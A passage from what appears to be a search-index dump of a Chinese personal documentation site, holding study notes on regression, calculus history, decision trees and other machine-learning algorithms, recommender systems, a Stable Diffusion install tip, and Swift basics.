逻辑回归用于建立自变量与二元分类目标变量之间的关系。它常用于解决分类问题，如判断邮件是否为垃圾邮件、预测用户是否会购买某个产品等。 输出类型： 线性回归 线性回归的输出是连续的实数值。可以是任意实数，可以是正数、负数或零。 逻辑回归 逻辑回归的输出是概率值，表示属于某个类别的概率。通常使用sigmoid函数将线性组合的结果映射到0到1之间的概率。 模型形式： 线性回归 线性回归模型假设自变量与因变量之间存在线性关系。\n模型形式可以表示为: Y = b0 + b1X1 + b2X2 + ... + bn*Xn 其中Y是因变量，X1, X2, ..., Xn是自变量，b0, b1, b2, ..., bn是回归系数。 逻辑回归 逻辑回归模型使用了sigmoid函数来建模，将线性组合的结果映射到0到1之间的概率。\n模型形式可以表示为: P(Y=1|X) = 1 / (1 + exp(-z)) 其中P(Y=1|X)是属于类别1的概率，z是线性组合的结果。 参数估计： 线性回归 线性回归通常使用最小二乘法（Ordinary Least Squares）来估计回归系数。\n目标是最小化观测值与模型预测值之间的平方差。 逻辑回归： 逻辑回归使用最大似然估计来估计回归系数。\n目标是最大化观测值的似然函数，即最大化观测值为实际类别的概率。","tags":"AI","url":"/yq-docs-AI-Digital-Logic-regression-and-linear-regression.html","loc":"/yq-docs-AI-Digital-Logic-regression-and-linear-regression.html"},{"title":"积分和微分","text":"以下主要针对这样的一元函数: y = f(x) 想起以前大学的一个概念 可导一定连续, 连续不一定可导 古典微积分, 导数 古典微积分求解曲线围成的面积的主要思想，就是把曲线下的面积划分成了无数个矩形面积之和 （显然）直觉告诉我们，如果  越大，则这个近似越准确 此时，无穷小量就出现了。\n在 古典微积分 学中，无穷小量是建立微积分的基础。\n莱布尼兹介绍微积分的论文就叫做《论深度隐藏的几何学及无穷小与无穷大的分析》。\n在当时的观点下，无穷小量到底是什么，也是颇有争论的。\n当时有数学家打比喻：\"无穷小量就好比山上的灰尘，去掉和增加都没有什么影响\"，很显然有人认为这是真实存在的。\n在具体计算曲线下面的面积，即我们现在所说的定积分的时候，必然会遇到导数的问题，所以很自然的开始了对导数的定义和讨论。 导数的古典定义 在曲线上取两点，连接起来所形成的直线，就称为曲线的割线： 连续的割线可以反应曲线的平均变化率。 也就是说，这一段曲线大概总的趋势是上升还是下降，上升了多少，用割线描述是并不是精确的。 有了切线之后我们进一步去定义导数 从这张图得出 导数 的定义 f'(x) = dy / dx 而 dx 和 dy 被称为 x 和 y 的 微分 ，都为无穷小量， 所以导数也被莱布尼兹称为 微商 (微分之商) 无穷小量导致的麻烦 上图实际上是有矛盾的 所以就古典微积分中切线的定义而言，微积分的基础就是不牢固的。 无穷小量的麻烦还远远不止这一些，x&#94;2 的导数是这样计算的: dx 先在除法中当作不为 0 的变量被约掉,\n再在最后的加法中当作 0 被忽略. 一会是0一会又不是0。\n无穷小量和无穷小量相除为什么可以得到不一样的值？难道不应该都是1？\n无穷小量还违反了 阿基米德公理 ，这个才是更严重的缺陷，\n康托尔证明过，如果阿基米德公理被违背的话会出大问题。 一边是看起来没有错的微积分，一边是有严重缺陷的无穷小量，这就是第二次数学危机。\n数学的严格性受到了挑战， \"对于数学，严格性不是一切，但是没有了严格性就没有了一切\"。 相关概念 无穷小量 在用古典微积分求解曲线围成的面积事，\n把曲线对的定义域[a,b]均分成间隔长度 delta x (这应该是三角形符号, 我没找到, 暂时直接用英文) 为n份，\n当 n->∞ 时， delta x 变成无穷小量，记作 dx ，即 x 的 微分 微分 微分是微小的增量，即无穷小量。在古典微积分学中，无穷小量是建立微积分的基础。 切线 通过无穷小量定义了切线。 导数 导数就是切线的斜率。 基于极限重建的微积分 莱布尼兹、欧拉等都认识到了无穷小量导致的麻烦，\n一直拼命想要修补，但这个问题等了200年后，即19世纪极限概念的清晰之后才得到解决。 解决办法是，完全摈弃无穷小量，基于极限的概念，重新建立了微积分。 可以看到，极限的描述并没有用到什么无穷小量。 导数 的极限定义 用极限重新严格定义了导数，此时已经脱离了微商的概念。也就是此时，导数应该被看成一个整体。\n不过我们仍然可以去定义什么是微分，说到这里，真是有点剧情反转: 古典微积分是先定义微分再定义导数， 现在极限微积分是先定义了导数再有微分。 相关概念 导数 导数被定义为一个极限，其意义就是变化率 微分 微分是一个线性函数，其意义就是变化的具体数值 切线 有了导数之后就可以被确定下来了 参考: https://zhuanlan.zhihu.com/p/38337248 古今微积分 微积分实际上被发明了两次。\n古典微积分和极限微积分可以说是两个东西。我们再来比较一下古典微积分和极限微积分。 古典微积分是先定义微分再定义导数； 极限微积分是先定义导数再定义微分。 古典微积分的导数是基于无穷小量定义的； 极限微积分的导数是基于极限定义的 古典微积分的微分是无穷小量； 极限微积分的微分是一个线性函数。 古典微积分的定积分是求无穷小矩形面积的和；极限微积分的定积分是求黎曼和。 古典微积分的切线是画出来的； 极限微积分的切线是算出来的。 古典微积分的建立过程很直观； 极限微积分的建立过程更抽象。 古典微积分最大的好处就是很直观，不过也是因为太直观了，\n所以我们一直都无法忘记它带来的印象，也对我们理解极限微积分造成了障碍。\n也让我们在实际应用中造成了错误的理解。 加权积分 比如摸球, 蓝球 10 分, 红球 5 分, 最后的得分就是: 10 * nBlue + 5 * nRed 这里 10, 5 就是权","tags":"AI","url":"/yq-docs-AI-Digital-Points-and-different-points.html","loc":"/yq-docs-AI-Digital-Points-and-different-points.html"},{"title":"数理相关","text":"逻辑回归和线性回归 方差与标准差 积分和微分","tags":"AI","url":"/yq-docs-AI-Digital-index.html","loc":"/yq-docs-AI-Digital-index.html"},{"title":"决策树算法 Decision Tree","text":"注解 属于监督学习(样本与对应结果已知) 决策树（Decision Tree），它是一种以树形数据结构来展示决策规则和分类结果的模型，\n作为一种归纳学习算法，其重点是将看似无序、杂乱的已知数据，\n通过某种技术手段将它们转化成可以预测未知数据的树状模型，\n每一条从根结点（对最终分类结果贡献最大的属性）到叶子结点（最终分类结果）的路径都代表一条决策的规则。\n决策树就是形如下图的结构（机器学习西瓜书的图）： 机器学习中，\n决策树是一个预测模型，树中每个节点表示某个对象，而每个分叉路径则代表某个可能的属性值，\n而每个叶节点则对应从根节点到该叶节点所经历的路径所表示的对象的值。\n决策树仅有单一输出，通常该算法用于解决分类问题。 一个决策树包含三种类型的节点： 决策节点：通常用矩形框来表示 机会节点：通常用圆圈来表示 终结点：通常用三角形来表示 简单决策树算法案例，确定人群中谁喜欢使用信用卡。\n考虑人群的年龄和婚姻状况，如果年龄在30岁或是已婚，\n人们更倾向于选择信用卡，反之则更少。\n通过确定合适的属性来定义更多的类别，可以进一步扩展此决策树。 在这个例子中，如果一个人结婚了，他超过30岁，他们更有可能拥有信用卡（100% 偏好）。\n测试数据用于生成决策树。 注解 对于那些各类别样本数量不一致的数据，在决策树当中信息增益的结果偏向于那些具有更多数值的特征。 构建决策树 训练阶段：从给定的训练数据集DB，构造出一颗决策树: class = DecisionTree(DB) 分类阶段：从根开始，按照决策树的分类属性，\n从上往下，逐层划分。直到叶子节点，便能获得结果: y = DecisionTree(x) 熵 信息熵（Information Entropy） 条件熵 决策树的划分依据是 信息增益 :\n所谓的信息增益是指 特征A对训练数据集D的信息增益g（D,A）\n定义为 集合D的信息熵H(D) 与 特征A给定条件下D的信息条件熵H(D|A) 之差，\n即公式为: g(D, A) = H(D) - H(D|A) 注解 信息增益表示得知特征X的信息而使得类Y的信息的不确定性减少的程度。 构造依据-熵 熵 表示数据的混乱程度, 理科的可以参考化学的 熵 熵越大, 数据越混乱, 不确定性越大, 越不确定 熵越小, 数据越不混乱, 不确定性越小, 越确定 我们用 Entropy 表示熵 所以当 Entropy 最大为1的时候，是分类效果最差的状态，当它最小为0的时候，是完全分类的状态。 决策树算法 上面也提到了, 构建决策树的过程就是寻找最优分割属性,\n然后以 最大化信息增益(ID3, C4.5) 或 基尼不纯度(CART) 的方式一直递归划分下去 算法 描述 ID3 其核心是在决策树的各级节点上，\n使用信息增益方法作为属性的选择标准，\n来帮助确定生成每个节点时所采用的合适属性 C4.5 C4.5决策树生成算法相对于ID3算法的重要改进\n是使用信息增益率来选择节点属性。\nC4.5算法可以売服ID3算法存在的不足：\nID3算法只适用于离散的描述属性，\n而C4.5算法既能够处理离散的描述属性，\n也可以处理连续的描述属性 CART CART决策树是一种十分有效的非参数分类和回归方法，\n通过构建树、修剪树、评估树 来构建一个二叉树。\n当终结点是连续变量时，该数为回归树；\n当终结点是分类变量，该数为分类树 决策树算法-ID3 最大化信息增益, 基于信息熵和信息增益做分类； 信息增益等于未划分时数据集的信息熵，减去划分之后所有子数据集的信息熵之和。 ( Gain(D,A)表示用特征A划分得到的信息增益，H(D)表示未划分时D的信息熵，H(D|A)表示用特征A划分得到的所有子数据集的信息熵之和 ) ( Di 表示划分之后得到的子数据集数量，H(D|A) 就是各个子数据集信息熵 H(Di) 的加权求和,权重为子样本数占全部样本的比例 ) 决策树每次对数据集进行划分需要选择最优的划分特征，\nID3就是对每个特征进行遍历，然后计算按此特征划分后得到的信息增益，\n选择增益最大的特征进行数据集的划分。然后再对每个子数据集进行同样的划分操作。 缺点： ID3信息增益准则对可取值数目较多的特征有所偏好，比如ID类特征的信息增益可接近于1； 只能用于处理离散分布的特征，不能处理连续值与缺失值； 只能用于分类。 决策树算法-C4.5 最大化信息增益率, 基于信息增益率做分类，是ID3的改进版； C4.5是为了解决ID3的一个缺点而产生的。\n缺点是啥？如果某个属性的分类很多，也就是分叉超多，那么该属性下的样本就很少，\n此时的信息增益就非常高，ID3这个愣头青就会认为这个属性适合用作划分。\n是，它确实是能划分，但取值较多的属性用作划分依据时，它的泛化能力弱，\n没法对新样本有效预测，所以C4.5不依靠信息增益划分样本，而是依靠\"信息增益率\"。 为了克服ID3倾向于取值数目较多的特征的缺陷，\nC4.5在信息增益的基础上添加了分母项，引入了信息增益率，计算公式如下： 分母项Ha会对取值数目较多的特征进行惩罚，\n特征取值数目越多，Ha越大，信息增益率就越小。\n所以很好的解决了ID3的缺点1。\n信息增益率同信息增益，都是越大越好。 注解 信息增益率虽然解决了倾向于取值较大的特征，但是又引入了倾向于取值较少特征的缺陷，\n所以其选择特征时不是直接选取信息增益率最大的特征，\n而是先从候选特征中找到信息增益高于平均值的特征，再从中选择使增益率最高的作为最优划分特征。 优点： 改进ID3倾向于选择取值较多的特征的缺点； 可处理连续值与缺失值。 缺点： 跟ID3一样只能用于分类； 计算量较大，计算信息熵有大量的对数运算，以及选取最优特征时，对连续值的排序等。 决策树算法-CART 基尼不纯度, 基于基尼系数，既可以做分类也可以做回归 CART决策树（Classification and Regression Tree）独立于另外两种决策树，\n一方面它使用基尼指数（Gini Index）作为划分依据，\n另一方面它既可以做分类，也可以做回归。\nPython中的sklearn决策树模型就是采用的CART来选择分支的。 分类树 (Classification Tree)：目标是分类数据、离散数据。例如：动物种类、人的性别。 回归树 (Regression Tree)：目标是连续的数据。例如：人的年龄、收入 基尼指数Gini(D) 反映的是数据集中随机抽取两个样本，\n而他们类别标志不一致的概率。\n（e.g.从100封邮件中随机抽两个，而这两个邮件\"是垃圾邮件\"和\"不是垃圾邮件\"的概率）\n基尼指数越小，代表数据集D的纯度越高。 C5.0又称为CART(分类回归树)，C5.0抛弃了用信息熵来衡量数据集的纯净度，\n使用了一种更简单的计算方式，称为基尼系数，其公式如下 Gini(D)表示从D中随机抽取两个样本，这两个样本的标签不一样的概率。\n概率越小，表示同类的样本数越多，数据集D越纯净，这性质与信息熵越大样本越纯净相反。 C5.0不再是考量划分前后信息熵的差距，而是基尼系数的差距。\nC5.0的计算过程没有引入log对数计算，所以它的计算复杂度要优于ID3与C4.5。 优点： 使用 Gini 系数来度量样本纯净度，减少了大量的对数运算； 可同时用于分类与回归； 缺点： 跟ID3一样，都倾向于多取值特征。 参考:: 【非常详细】通俗易懂的讲解决策树（Decision Tree） 一文看懂决策树（Decision Tree） 决策树（Decision Tree）（三种原理+步骤） 《机器学习》之 深入浅出决策树(原理+代码)","tags":"AI","url":"/yq-docs-AI-Machine-learning-Machine-learning-algorithm-Decision-Tree-algorithm-DECISION-TREE.html","loc":"/yq-docs-AI-Machine-learning-Machine-learning-algorithm-Decision-Tree-algorithm-DECISION-TREE.html"},{"title":"降维算法 Dimensional Reduction","text":"在机器学习和统计学领域，降维是指在限定条件下，降低随机变量个数，\n得到一组\"不相关\"主变量的过程，并可进一步细分为特征选择和特征提取两大方法。 一些数据集可能包含许多难以处理的变量。\n特别是资源丰富的情况下，系统中的数据将非常详细。\n在这种情况下，数据集可能包含数千个变量，其中大多数变量也可能是不必要的。\n在这种情况下，几乎不可能确定对我们的预测影响最大的变量。\n此时，我们需要使用降维算法，降维的过程中也可能需要用到其他算法，\n例如借用随机森林，决策树来识别最重要的变量。","tags":"AI","url":"/yq-docs-AI-Machine-learning-Machine-learning-algorithm-Dimensional-Reduction.html","loc":"/yq-docs-AI-Machine-learning-Machine-learning-algorithm-Dimensional-Reduction.html"},{"title":"梯度增强算法 Gradient Boosting","text":"梯度增强算法（Gradient Boosting）使用多个弱算法来创建更强大的精确算法。\n它与使用单个估计量不同，而是使用多个估计量创建一个更稳定和更健壮的算法。梯度增强算法有几种： XGBoost  — 使用线性和树算法 LightGBM  — 只使用基于树的算法 梯度增强算法的特点是精度较高。此外，LightGBM 算法具有令人难以置信的高性能。","tags":"AI","url":"/yq-docs-AI-Machine-learning-Machine-learning-algorithm-Gradient-enhancement-algorithm-Gradient-Boosting.html","loc":"/yq-docs-AI-Machine-learning-Machine-learning-algorithm-Gradient-enhancement-algorithm-Gradient-Boosting.html"},{"title":"k-平均算法 K-Means","text":"k-平均算法(K-Means)是一种无监督学习算法，为聚类问题提供了一种解决方案。 K-Means 算法把 n 个点（可以是样本的一次观察或一个实例）划分到 k 个集群（cluster），\n使得每个点都属于离他最近的均值（即聚类中心，centroid）对应的集群。\n重复上述过程一直持续到重心不改变。","tags":"AI","url":"/yq-docs-AI-Machine-learning-Machine-learning-algorithm-K-average-algorithm-K-Means.html","loc":"/yq-docs-AI-Machine-learning-Machine-learning-algorithm-K-average-algorithm-K-Means.html"},{"title":"线性回归算法 Linear Regression","text":"回归分析(Regression Analysis)是统计学的数据分析方法，\n目的在于了解两个或多个变量间是否相关、相关方向与强度，\n并建立数学模型以便观察特定变量来预测其它变量的变化情况。 线性回归算法(Linear Regression)的建模过程就是使用数据点来寻找最佳拟合线。\n公式: y = mx + c 其中 y 是因变量，x 是自变量，利用给定的数据集求 m 和 c 的值。\n线性回归又分为两种类型，即 简单线性回归 (simple linear regression)，只有 1 个自变量； 多变量回归 (multiple regression)，至少两组以上自变量。","tags":"AI","url":"/yq-docs-AI-Machine-learning-Machine-learning-algorithm-Linear-regression-algorithm-Linear-Regression.html","loc":"/yq-docs-AI-Machine-learning-Machine-learning-algorithm-Linear-regression-algorithm-Linear-Regression.html"},{"title":"逻辑回归算法 Logistic Regression","text":"逻辑回归算法(Logistic Regression)一般用于需要明确输出的场景，如某些事件的发生(预测是否会发生降雨)。\n通常，逻辑回归使用某种函数将概率值压缩到某一特定范围。 例如，Sigmoid 函数(S 函数)是一种具有 S 形曲线、用于二元分类的函数。\n它将发生某事件的概率值转换为 0, 1 的范围表示: Y = E &#94; (b0＋b1 x) / (1 + E &#94; (b0＋b1 x ) ) 以上是一个简单的逻辑回归方程，B0，B1是常数。这些常数值将被计算获得，以确保预测值和实际值之间的误差最小。","tags":"AI","url":"/yq-docs-AI-Machine-learning-Machine-learning-algorithm-Logic-regression-algorithm-logistic-regression.html","loc":"/yq-docs-AI-Machine-learning-Machine-learning-algorithm-Logic-regression-algorithm-logistic-regression.html"},{"title":"朴素贝叶斯算法 Naive Bayes","text":"朴素贝叶斯算法（Naive Bayes）基于概率论的贝叶斯定理，应用非常广泛，从文本分类、垃圾邮件过滤器、医疗诊断等等。\n朴素贝叶斯适用于特征之间的相互独立的场景，例如利用花瓣的长度和宽度来预测花的类型。\n\"朴素\"的内涵可以理解为特征和特征之间独立性强。 与朴素贝叶斯算法密切相关的一个概念是最大似然估计(Maximum likelihood estimation)，\n历史上大部分的最大似然估计理论也都是在贝叶斯统计中得到大发展。\n例如，建立人口身高模型，很难有人力与物力去统计全国每个人的身高，\n但是可以通过采样，获取部分人的身高，然后通过最大似然估计来获取分布的均值与方差。 注解 Naive Bayes is called naive because it assumes that each input variable is independent.","tags":"AI","url":"/yq-docs-AI-Machine-learning-Machine-learning-algorithm-Naive-Bayes.html","loc":"/yq-docs-AI-Machine-learning-Machine-learning-algorithm-Naive-Bayes.html"},{"title":"最近邻居/k-近邻算法(K-Nearest Neighbors,KNN)","text":"注解 属于无监督学习 KNN算法是一种基于实例的学习，或者是局部近似和将所有计算推迟到分类之后的惰性学习。\n用最近的邻居（k）来预测未知数据点。\nk 值是预测精度的一个关键因素，无论是分类还是回归，衡量邻居的权重都非常有用，较近邻居的权重比较远邻居的权重大 KNN 算法的缺点是对数据的局部结构非常敏感。\n计算量大，需要对数据进行规范化处理，使每个数据点都在相同的范围。 举例: from sklearn import datasets\nfrom sklearn.neighbors import KNeighborsClassifier\n\n#digit dataset from sklearn\ndigits = datasets.load_digits()\n\n#set training set\nx, y = digits.data[:-1], digits.target[:-1]\n\n#train model\nclf.fit(x,y)\n\n#predict\ny_pred = clf.predict([digits.data[-1]])\ny_true = digits.target[-1]\ny_pred, y_true 延伸：KNN 的一个缺点是依赖于整个训练数据集，\n学习向量量化（Learning Vector Quantization，LVQ)是一种监督学习的人神经网络算法，\n允许你选择训练实例。 LVQ 由数据驱动，搜索距离它最近的两个神经元，\n对于同类神经元采取拉拢，异类神经元采取排斥，最终得到数据的分布模式。\n如果基于 KNN 可以获得较好的数据集分类效果，\n利用 LVQ 可以减少存储训练数据集存储规模。\n典型的学习矢量量化算法有LVQ1、LVQ2和LVQ3，尤以LVQ2的应用最为广泛。","tags":"AI","url":"/yq-docs-AI-Machine-learning-Machine-learning-algorithm-Near-neighboring-K-Nearest-Neighbors-(KNN).html","loc":"/yq-docs-AI-Machine-learning-Machine-learning-algorithm-Near-neighboring-K-Nearest-Neighbors-(KNN).html"},{"title":"随机森林算法 Random Forest","text":"属于集成学习 随机森林算法（Random Forest）的名称由 1995 年由贝尔实验室提出的random decision forests 而来，\n正如它的名字所说的那样，随机森林可以看作一个决策树的集合。 随机森林中每棵决策树估计一个分类，这个过程称为\"投票（vote）\"。\n理想情况下，我们根据每棵决策树的每个投票，选择最多投票的分类。 可以参考文档: https://www.stat.berkeley.edu/~breiman/randomforest2001.pdf 本地文档: ../../../../resources/pdf/randomforest2001.pdf","tags":"AI","url":"/yq-docs-AI-Machine-learning-Machine-learning-algorithm-Random-Forest.html","loc":"/yq-docs-AI-Machine-learning-Machine-learning-algorithm-Random-Forest.html"},{"title":"支持向量机算法(Support Vector Machine,SVM)","text":"支持向量机/网络算法(SVM)属于分类型算法。 SVM模型将实例表示为空间中的点，将使用一条直线分隔数据点。\n需要注意的是，支持向量机需要对输入数据进行完全标记，\n仅直接适用于两类任务，应用将多类任务需要减少到几个二元问题 举例: from sklearn import svm, datasets\n\n#digit dataset from sklearn\ndigits = datasets.load_digits()\n\n#create the Support Vector Classifier\nclf = svm.SVC(gamma = 0.001, C = 100)\n\n#set training set\nx, y = digits.data[:-1], digits.target[:-1]\n\n#train model\nclf.fit(x, y)\n\n#predict\ny_pred = clf. predict([digits.data[-1]])\ny_true = digits.target[-1]\ny_pred, y_true","tags":"AI","url":"/yq-docs-AI-Machine-learning-Machine-learning-algorithm-Support-vector-machine-algorithm-(SVM).html","loc":"/yq-docs-AI-Machine-learning-Machine-learning-algorithm-Support-vector-machine-algorithm-(SVM).html"},{"title":"机器学习算法","text":"机器学习算法大致可以分为三类： 监督学习算法 (Supervised Algorithms) 在监督学习训练过程中，可以由训练数据集学到或建立一个模式(函数 / learning model)，\n并依此模式推测新的实例。 该算法要求特定的输入/输出，首先需要决定使用哪种数据作为范例。\n例如，文字识别应用中一个手写的字符，或一行手写文字。\n主要算法包括神经网络、支持向量机、最近邻居法、朴素贝叶斯法、决策树等。 无监督学习算法 (Unsupervised Algorithms) 这类算法没有特定的目标输出，算法将数据集分为不同的组。 强化学习算法 (Reinforcement Algorithms) 强化学习普适性强，主要基于决策进行训练，算法根据输出结果(决策)的成功或错误来训练自己，\n通过大量经验训练优化后的算法将能够给出较好的预测。 类似有机体在环境给予的奖励或惩罚的刺激下，逐步形成对刺激的预期，\n产生能获得最大利益的习惯性行为。 在运筹学和控制论的语境下，强化学习被称作\"近似动态规划\"(approximate dynamic programming，ADP)。 十大机器学习算法 线性回归算法 Linear Regression 支持向量机算法(Support Vector Machine,SVM) 最近邻居k-近邻算法(K-Nearest Neighbors,KNN) 逻辑回归算法 Logistic Regression 决策树算法 Decision Tree k-平均算法 K-Means 随机森林算法 Random Forest 朴素贝叶斯算法 Naive Bayes 降维算法 Dimensional Reduction 梯度增强算法 Gradient Boosting 参考: Machine Learning: 十大机器学习算法","tags":"AI","url":"/yq-docs-AI-Machine-learning-Machine-learning-algorithm-index.html","loc":"/yq-docs-AI-Machine-learning-Machine-learning-algorithm-index.html"},{"title":"推荐系统","text":"协同过滤 协同过滤步骤 收集用户偏好 用户行为如评分/投票/转发/收藏/评论 找到相似用户/物品 相似度计算 欧几里得距离 皮尔逊相关系数 协方差\n.. $$ cov(x, y) = frac {sum _{i=0} (x_i - bar x)(y_i - bar y)} {n-1} $$ 皮尔逊 相关系数\n.. $$ rho _x, _y = corr(x, y) = frac {cov(x, y)} {sigma _x sigma _y} = frac {E[(x - mu _x)(y - mu _y)]} {sigma _x sigma _y} $$ person 相关系数是用协方差除以两个变量标准差得到 Cosine相似度 (余弦距离) 计算推荐 分类 基于用户的协同过滤 存在问题 稀疏问题 用户量百万计，量大 人善变 （其实就是未来的分布无法保证于现在一致） 基于物品的协同过滤 物品与物品相似度 相对优点 计算性能高， 通常用户数量远大于物品数量 可预先计算保留， 物品不善变 隐语义模型 分解 组合","tags":"AI","url":"/yq-docs-AI-Machine-learning-Recommended-system.html","loc":"/yq-docs-AI-Machine-learning-Recommended-system.html"},{"title":"机器学习","text":"推荐系统 机器学习算法","tags":"AI","url":"/yq-docs-AI-Machine-learning-index.html","loc":"/yq-docs-AI-Machine-learning-index.html"},{"title":"开源模型","text":"stable-diffusion","tags":"AI","url":"/yq-docs-AI-Open-source-model-index.html","loc":"/yq-docs-AI-Open-source-model-index.html"},{"title":"stable-diffusion","text":"安装-官方教程: https://github.com/AUTOMATIC1111/stable-diffusion-webui/wiki 我是N卡: 先去下载包: https://github.com/AUTOMATIC1111/stable-diffusion-webui/releases/download/v1.0.0-pre/sd.webui.zip 解压后，先 update.bat 再 run.bat","tags":"AI","url":"/yq-docs-AI-Open-source-model-stable-diffusion.html","loc":"/yq-docs-AI-Open-source-model-stable-diffusion.html"},{"title":"swift-命令行-创建并运行项目","text":"官网: https://www.swift.org/getting-started/cli-swiftpm/ 平台: MacOS 以创建一个 Hello World 作为说明 项目创建与运行 创建项目: $ mkdir MyCLI\n$ cd MyCLI\n$ swift package init --name MyCLI --type executable 生成以下结构目录文件: .\n├── Package.swift\n└── Sources\n    └── main.swift 执行程序: $ swift run MyCLI\nBuilding for debugging...\n[3/3] Linking MyCLI\nBuild complete! (0.68s)\nHello, world!","tags":"后端; swift","url":"/yq-backend-swift-course-create-pro.html","loc":"/yq-backend-swift-course-create-pro.html"},{"title":"基本语法","text":"常识了解 Swift Playground 可视为一个可交互的文档， 所写即所得 内置关键字 let 常量定义 var 变量定义 print 打印输出 typealias 定义类型别名 如定义了 Int 的类型别名为 Feet: typealias Feet = Int guard guard语句和if语句有点类似，都是根据其关键字之后的表达式的布尔值决定下一步执行什么。\n但与if语句不同的是，guard语句只会有一个代码块，不像if语句可以if else多个代码块。 那么guard语句的作用到底是什么呢？顾名思义，就是守护。\nguard语句判断其后的表达式布尔值为false时，才会执行之后代码块里的代码，\n如果为true，则跳过整个guard语句: // 检查身份证，如果身份证没带，则不能进入考场\nguard let id = person[\"id\"] else {\n    print(\"没有身份证，不能进入考场!\")\n    return\n} 内置数据类型 Int 整型 UInt 无符号整型 尽量不要使用UInt，除非你真的需要存储一个和当前平台原生字长相同的无符号整数。\n除了这种情况，最好使用Int，即使你要存储的值已知是非负的。\n统一使用Int可以提高代码的可复用性，避免不同类型数字之间的转换，并且匹配数字的类型推断。 注解 整数类型需要注意以下几点： 在 32 位系统上, Int 和 Int32 长度相同。 在 64 位系统上, Int 和 Int64 长度相同。 在 32 位系统上, UInt 和 UInt32 长度相同。 在 64 位系统上, UInt 和 UInt64 长度相同。 Int8, Int16, Int32, Int64 分别表示 8 位, 16 位, 32 位, 和 64 位的有符号整数形式。 UInt8, UInt16, UInt32, UInt64 分别表示 8 位, 16 位, 32 位 和 64 位的无符号整数形式。 Float 32浮点数，精度要求不高的话可以使用此类型。 浮点类型比整数类型表示的范围更大，可以存储比 Int 类型更大或者更小的数字 Double 64位浮点数，当你需要存储很大或者很高精度的浮点数时请使用此类型。 注解 Double精确度很高，至少有15位数字，\n而 Float 最少只有6位数字。\n选择哪个类型取决于你的代码需要处理的值的范围。 Bool 布尔值 基本的布尔（Boolean）类型，叫做 Bool。布尔值指逻辑上的值，因为它们只能是真或者假。\nSwift 有两个布尔常量，true 和 false。 String 字符串是字符的序列集合 Character 字符指的是单个字母 Optional 使用可选类型来处理值可能缺失的情况。可选类型表示有值或没有值。 如以下两种声明相等: var optionalInteger: Int?\nvar optionalInteger: Optional<Int> 当你声明一个可选变量或者可选属性的时候没有提供初始值，它的值会默认为 nil 若为布尔， 貌似默认为true 如果一个可选类型的实例包含一个值，你可以用后缀操作符 ！来访问这个值: optionalInteger = 42\noptionalInteger! // 42 当你确定可选类型确实包含值之后，你可以在可选的名字后面加一个感叹号（!）来获取值，\n这被称为可选值的 强制解析（forced unwrapping） 这部分(问号/叹号)的使用, 与ts基本一致 注解 使用!来获取一个不存在的可选值会导致运行时错误。\n使用!来强制解析值之前，一定要确定可选包含一个非nil的值。 可选绑定 使用可选绑定（optional binding）来判断可选类型是否包含值，\n如果包含就把值赋给一个临时常量或者变量。 可选绑定可以用在if和while语句中来对可选类型的值进行判断并把值赋给一个常量或者变量。 实例: import Cocoa\n\nvar myString:String?\n\nmyString = \"Hello, Swift!\"\n\nif let yourString = myString {\n  print(\"你的字符串值为 - \\(yourString)\")\n}else{\n  print(\"你的字符串没有值\")\n} 以上程序执行结果为: 你的字符串值为 - Hello, Swift! Array todo Dictionary todo Struct todo Class todo 类型安全 Swift 是一个类型安全（type safe）的语言。 由于 Swift 是类型安全的，\n所以它会在编译你的代码时进行类型检查（type checks），并把不匹配的类型标记为错误。\n这可以让你在开发的时候尽早发现并修复错误。 类型推断 不需要每次声明常量和变量的时候都显式指定类型 如果你没有显式指定类型，Swift 会使用类型推断（type inference）来选择合适的类型。 当推断浮点数的类型时，Swift 总是会选择Double而不是Float。 如果表达式中同时出现了整数和浮点数，会被推断为Double类型 Swift 变量 变量是一种使用方便的占位符，用于引用计算机内存地址。 声明: var variableName = <initial value>\n\nvar varB:Float 变量名可以由字母，数字和下划线组成 变量名需要以字母或下划线开始 区分大小写 Swift 常量 设定后不可变 声明常量或者变量的时候可以加上类型标注（type annotation），\n说明常量或者变量中要存储的值的类型: var constantName:<data type> = <optional initial value> Swift 运算符 算术运算符 + - * / % , 分别表示 加 减 乘 除 求余 比较运算符 == 等于 !=  不等于 >   大于 <   小于 >=  大于等于 <=  小于等于 逻辑运算符 &&  逻辑与。如果运算符两侧都为 TRUE 则为 TRUE。 ||  逻辑或。 如果运算符两侧至少有一个为 TRUE 则为 TRUE。 !   逻辑非。布尔值取反，使得true变false，false变true。 位运算符 位运算符用来对二进制位进行操作， ~ & | &#94; << >> 分别为取反，按位与与，按位与或，按位与异或运算, 按位左移， 按位右移 赋值运算符 =   简单的赋值运算，指定右边操作数赋值给左边的操作数 +=  相加后再赋值，将左右两边的操作数相加后再赋值给左边的操作数。 -=  相减后再赋值，将左右两边的操作数相减后再赋值给左边的操作数。 *= 相乘后再赋值，将左右两边的操作数相乘后再赋值给左边的操作数。 /=  相除后再赋值，将左右两边的操作数相除后再赋值给左边的操作数 %=  求余后再赋值，将左右两边的操作数求余后再赋值给左边的操作数 <<= 按位左移后再赋值 >>= 按位右移后再赋值 &=  按位与运算后赋值 &#94;=  按位异或运算符后再赋值 |= 按位或运算后再赋值 区间运算符 闭区间运算符: 闭区间运算符 （a...b） 定义一个包含从a到b(包括a和b)的所有值的区间,\n必须大于等于a。 闭区间运算符在迭代一个区间的所有值时是非常有用的，\n如在for-in循环中: 1...5 区间值为 1, 2, 3, 4 和 5 半开区间运算符     半开区间（a..<b）定义一个从a到b但不包括b的区间。 之所以称为半开区间，\n是因为该区间包含第一个值而不包括最后的值。 如： 1..< 5 区间值为 1, 2, 3, 和 4 其他运算符 其他类型的的运算符，如一元、二元和三元运算符 一元减:        数字前添加 - 号前缀,    -3 或 -4 一元加:        数字前添加 + 号前缀,    +6 结果为 6 三元运算符:      condition ? X : Y,      如果 condition 为 true ，值为 X ，否则为 Y 重要 运算符优先级 优先级从上到下依次递减，最上面具有最高的优先级，逗号操作符具有最低的优先级。 相同优先级中，按结合顺序计算。大多数运算是从左至右计算，只有三个优先级是从右至左结合的，\n它们是单目运算符、条件运算符、赋值运算符。 基本的优先级需要记住： 指针最优，单目运算优于双目运算。如正负号。 先乘除（模），后加减。 先算术运算，后移位运算，最后位运算。\n特别注意： 1 << 3 + 2 & 7 等价于 (1 << (3 + 2))&7 逻辑运算最后计算 合并空值运算符：?? 合并空值运算符 a ?? b 如果可选项 a 有值则展开，如果没有值，是 nil，则返回默认值 b。 表达式 a 必须是一个可选类型，表达式 b 必须与 a 的存储类型相同 合并空值运算符，实际上是三元运算符作用到 Optional 上的缩写 a != nil ? a! : b 如果 a 